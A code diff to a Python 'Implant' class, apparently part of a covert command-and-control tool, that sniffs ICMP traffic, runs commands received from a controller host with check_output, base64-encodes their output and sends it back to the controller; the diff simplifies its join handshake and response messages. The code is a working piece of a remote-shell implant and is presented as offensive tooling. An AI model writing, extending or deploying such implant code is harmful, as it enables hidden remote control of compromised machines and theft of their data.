@@ -15,14 +15,9 @@ class Implant(Host):
         self.controller_ip = controller_ip
 
     def join(self, shellpack):
-        match shellpack['message']:
-            case "how are you":
-                self.send(self.controller_ip, "join", "fine thank you")
-
-        return
+        self.send(shellpack['ip'], "join")
 
     def instruction(self, shellpack):
-        # try:
         if shellpack['message'] != 'request':
             raise Exception
         try:
@@ -31,11 +26,9 @@ class Implant(Host):
             output = check_output(cmd, stderr=STDOUT, timeout=3)
             output = base64.b64encode(output)
             
-            self.send(self.controller_ip, "instruction", "response", output)
+            self.send(self.controller_ip, "instruction", output)
         except TimeoutExpired:
             raise Exception
-        # except Exception:
-        #     self.send(self.controller_ip, "error", "error with instruction")
 
 if __name__ == "__main__":
     print("[ Setting up implant... ]")
@@ -46,7 +39,7 @@ if __name__ == "__main__":
 
     print("[ Shellpack log ]")
     # Send join command
-    implant.send(implant.controller_ip, "join", "hello how are you")
+    implant.send(implant.controller_ip, "join")
 
     # Start sniffing
     sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
